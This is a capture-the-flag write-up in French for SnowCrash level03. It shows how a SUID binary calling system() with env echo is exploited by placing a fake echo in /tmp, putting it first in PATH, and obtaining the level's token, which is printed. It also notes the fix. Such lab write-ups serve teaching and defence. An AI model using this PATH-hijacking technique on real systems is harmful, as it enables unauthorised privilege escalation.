# SnowCrash - level03 writeup

## Objectif

Exploiter le binaire SUID level03 pour exécuter getflag en contexte privilégié.

## Recon

Traçage des appels libc pour comprendre ce que lance le binaire :

```
ltrace ./level03
```

Sortie importante :

```
system("/usr/bin/env echo Exploit me")
```

Donc le programme appelle system() avec /usr/bin/env echo ... - il dépend de la résolution de echo via l’environnement (PATH).

## Analyse

/usr/bin/env cherche l’exécutable echo dans le PATH.
Si on place un faux echo avant /bin/echo dans le PATH, level03 exécutera notre binaire/script à la place.

## Exploitation

Création d’un faux echo dans /tmp qui exécute getflag :

```
echo getflag > /tmp/echo
chmod 777 /tmp/echo
export PATH="/tmp/:/bin"
```

Exécution du binaire vulnérable :

```
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Résultat

- Technique - > PATH hijacking via env
- Token getflag - > qi0maab88jeaj46qoumi7maus

## Notes

- Vulnérabilité : appel à system() + commande non “hardcodée” côté binaire (résolution via PATH)
- Correction typique : utiliser un chemin absolu (/bin/echo), nettoyer l’environnement, ou éviter system()
